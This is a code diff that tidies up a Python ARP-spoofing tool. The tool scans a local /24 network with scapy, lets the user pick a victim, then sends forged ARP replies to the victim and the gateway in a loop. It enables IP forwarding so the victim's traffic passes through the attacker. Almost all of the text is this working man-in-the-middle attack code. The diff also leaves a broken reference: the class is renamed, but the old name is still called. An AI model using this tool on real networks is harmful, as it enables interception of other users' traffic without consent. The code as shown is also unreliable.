@@ -4,8 +4,8 @@ import socket
 import time 
 import subprocess 
 
-class Network_Scanner:
 
+class NetworkScanner:
     def __init__(self):
         self.clients_list = []
         self.hostname = ""
@@ -22,7 +22,7 @@ class Network_Scanner:
         while progress_visualiser != 256:
             print("\rScanning IP: " + str(ip[:-4]) + str(progress_visualiser), end="")
             time.sleep(0.005)
-            progress_visualiser +=1 
+            progress_visualiser += 1
   
         for element in answered_list:
             client_dic = {"ip": element[1].psrc, "mac": element[1].hwsrc}
@@ -31,7 +31,6 @@ class Network_Scanner:
         return self.clients_list
 
     def get_host_name(self, ip):
-
         try:
             return socket.gethostbyaddr(ip)[0]
         except socket.herror:
@@ -40,37 +39,36 @@ class Network_Scanner:
     def print_result(self, results_list):
         result_number = 0
 
-        print("\n\n IP\t\t MAC Address\t\tHostName\tScan No:" + str(self.amount_of_scans_ran) + "\n-----------------------------------------------------------------")
+        print("\n\n IP\t\t MAC Address\t\tHostName\tScan No:" + str(self.amount_of_scans_ran) +
+              "\n-----------------------------------------------------------------")
 
         for client in results_list:
             host_name = self.get_host_name(client["ip"])
 
             print(result_number, client["ip"] + "\t " + client["mac"] + "\t" + str(host_name) + "\t")
-            result_number +=1
+            result_number += 1
 
         print("-----------------------------------------------------------------")
 
     def run(self, ip):
-      
         print("\n")
 
         if self.amount_of_scans_ran == 0:
             scan_result = self.scan(ip)
-            self.amount_of_scans_ran +=1
+            self.amount_of_scans_ran += 1
 
         else:
             # Clears the previous scan result  
             self.clients_list.clear()
 
             scan_result = self.scan(ip)
-            self.amount_of_scans_ran +=1
+            self.amount_of_scans_ran += 1
 
         self.print_result(scan_result)
 
         print("\n")
 
     def export_scan_result(self, target_choice):
-
         # Only Exports the Routers IP/MAC if the user is manually spoofing a target
         if target_choice == 00:
             gateway_ip_and_mac = self.clients_list[0]
@@ -85,7 +83,6 @@ class Network_Scanner:
 
 
 class Spoof:
-
     def __init__(self, victim_ip_mac, gateway_ip_mac):
         self.target_ip = victim_ip_mac["ip"]
         self.target_mac = victim_ip_mac["mac"]
@@ -93,7 +90,6 @@ class Spoof:
         self.gateway_ip = gateway_ip_mac["ip"]
         self.gateway_mac = gateway_ip_mac["mac"]
 
-    
     def spoof(self, target_ip, spoof_ip):
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.target_mac, psrc=spoof_ip)
         scapy.send(packet, verbose=False)
@@ -103,9 +99,8 @@ class Spoof:
         scapy.send(packet, count=4, verbose=False)
 
     def run(self):
-
-        # Allow the internet connection to continue on target device
-        print("\nEnabaling Packet Forwarding")
+        # Allows the internet connection to continue on target device
+        print("\nEnabling Packet Forwarding")
         (subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=1"]))
 
         # Gets the name of the target device 
@@ -120,31 +115,29 @@ class Spoof:
         try:
             sent_packets_count = 0
             while True:
-                    self.spoof(self.target_ip, self.gateway_ip)
-                    self.spoof(self.gateway_ip, self.target_ip)
-                    sent_packets_count += 2
+                self.spoof(self.target_ip, self.gateway_ip)
+                self.spoof(self.gateway_ip, self.target_ip)
+                sent_packets_count += 2
 
-                    print("\rPackets Sent: " + str(sent_packets_count) + ("\t - Press CTRL + C to Stop"), end="") 
-                    time.sleep(2)
+                print("\rPackets Sent: " + str(sent_packets_count) + "\t - Press CTRL + C to Stop", end="")
+                time.sleep(2)
 
-            
         except KeyboardInterrupt:
             print("\n - Stopping Spoof, Resetting ARP tables\n")
             self.restore(self.target_ip, self.gateway_ip)
 
-        print("Disabaling Packet Forwarding")
+        print("Disabling Packet Forwarding")
         subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=0"])
         print("\n")
 
 
 def run_program():
-
     scan = Network_Scanner()
     scan.run("192.168.1.1/24")
 
     run_spoof_choice = ""
 
-    while run_spoof_choice !=4:
+    while run_spoof_choice != 4:
         run_spoof_choice = input("1. Spoof Target\n2. Spoof Manually\n3. Run Scan Again\n4. Quit\n")
 
         if run_spoof_choice == "1":
@@ -175,7 +168,6 @@ def run_program():
             spoof_attack_2 = Spoof(victim_ip_and_mac, gateway_ip_and_mac)
             spoof_attack_2.run()
 
-
         elif run_spoof_choice == "3":
             scan.run("192.168.1.1/24")
 
@@ -185,11 +177,8 @@ def run_program():
         else:
             print("Invalid Choice")
 
-run_program()
 
+run_program()
 
 #This needs to be run in order for the target machine internet to continue working
 # sudo sysctl -w net.inet.ip.forwarding=1
-
-
-#sudo when running
